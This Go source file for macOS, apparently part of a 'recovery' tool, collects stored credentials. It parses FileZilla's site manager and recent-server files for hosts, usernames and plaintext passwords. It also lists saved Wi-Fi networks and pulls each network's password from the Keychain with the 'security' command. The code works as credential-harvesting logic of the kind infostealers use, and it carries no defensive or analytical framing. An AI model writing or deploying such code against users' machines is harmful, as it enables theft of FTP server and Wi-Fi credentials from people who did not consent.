//go:build darwin

package scanner

import (
	"encoding/xml"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"recovery/recovery/crypto"
	"recovery/recovery/types"
)

func ScanApps() []types.AppCredentialResult {
	var results []types.AppCredentialResult
	results = append(results, scanFileZillaDarwin()...)
	results = append(results, scanWiFiDarwin()...)
	return results
}

type fzServerDarwin struct {
	XMLName  xml.Name `xml:"Server"`
	Host     string   `xml:"Host"`
	Port     int      `xml:"Port"`
	Protocol int      `xml:"Protocol"`
	User     string   `xml:"User"`
	Pass     string   `xml:"Pass"`
}

type fzSiteManagerDarwin struct {
	XMLName xml.Name         `xml:"FileZilla3"`
	Servers []fzServerDarwin `xml:"Servers>Server"`
}

type fzRecentServersDarwin struct {
	XMLName xml.Name         `xml:"FileZilla3"`
	Servers []fzServerDarwin `xml:"RecentServers>Server"`
}

func scanFileZillaDarwin() []types.AppCredentialResult {
	var results []types.AppCredentialResult
	home, _ := os.UserHomeDir()
	if home == "" {
		return nil
	}

	fzDirs := []string{
		filepath.Join(home, "Library", "Application Support", "FileZilla"),
		filepath.Join(home, ".config", "filezilla"),
	}

	for _, fzDir := range fzDirs {
		for _, file := range []string{"sitemanager.xml", "recentservers.xml"} {
			path := filepath.Join(fzDir, file)
			data, err := os.ReadFile(path)
			if err != nil {
				continue
			}

			var servers []fzServerDarwin
			if file == "sitemanager.xml" {
				var sm fzSiteManagerDarwin
				if xml.Unmarshal(data, &sm) == nil {
					servers = sm.Servers
				}
			} else {
				var rs fzRecentServersDarwin
				if xml.Unmarshal(data, &rs) == nil {
					servers = rs.Servers
				}
			}

			for _, s := range servers {
				if s.Host == "" {
					continue
				}
				port := s.Port
				if port == 0 {
					port = 21
				}
				protocol := "ftp"
				switch s.Protocol {
				case 1:
					protocol = "sftp"
				case 3, 4:
					protocol = "ftps"
				}
				results = append(results, types.AppCredentialResult{
					Application: "FileZilla",
					Host:        s.Host,
					Port:        port,
					Username:    s.User,
					Password:    s.Pass,
					Protocol:    protocol,
				})
			}
		}
	}

	return results
}

func scanWiFiDarwin() []types.AppCredentialResult {
	var results []types.AppCredentialResult

	interfaces := listWiFiInterfacesDarwin()
	if len(interfaces) == 0 {
		interfaces = []string{"en0", "en1"}
	}

	seen := make(map[string]bool)
	for _, iface := range interfaces {
		out, err := exec.Command("/usr/sbin/networksetup", "-listpreferredwirelessnetworks", iface).Output()
		if err != nil {
			continue
		}
		for _, line := range strings.Split(string(out), "\n") {
			name := strings.TrimSpace(line)
			if name == "" || strings.HasPrefix(name, "Preferred networks") || seen[name] {
				continue
			}
			seen[name] = true

			password, _ := crypto.RunSecurityStdout(
				"find-generic-password", "-wa", name, "-D", "AirPort network password",
			)
			results = append(results, types.AppCredentialResult{
				Application: "WiFi",
				Host:        name,
				Password:    password,
				Protocol:    "wifi",
				Extra:       iface,
			})
		}
	}

	return results
}

func listWiFiInterfacesDarwin() []string {
	out, err := exec.Command("/usr/sbin/networksetup", "-listallhardwareports").Output()
	if err != nil {
		return nil
	}
	var interfaces []string
	var current string
	for _, line := range strings.Split(string(out), "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "Device: ") {
			current = strings.TrimSpace(strings.TrimPrefix(line, "Device: "))
			continue
		}
		if strings.Contains(line, "Wi-Fi") || strings.Contains(line, "AirPort") {
			if current != "" {
				interfaces = append(interfaces, current)
			}
		}
	}
	return interfaces
}